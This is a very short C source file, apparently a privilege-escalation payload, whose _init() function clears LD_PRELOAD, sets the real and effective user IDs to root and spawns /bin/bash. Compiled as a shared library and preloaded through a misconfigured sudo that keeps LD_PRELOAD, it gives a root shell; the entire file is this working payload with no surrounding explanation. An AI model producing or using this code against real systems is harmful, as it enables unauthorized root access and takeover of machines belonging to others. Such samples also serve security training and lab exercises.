#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setreuid(0, 0);
    system("/bin/bash");
}
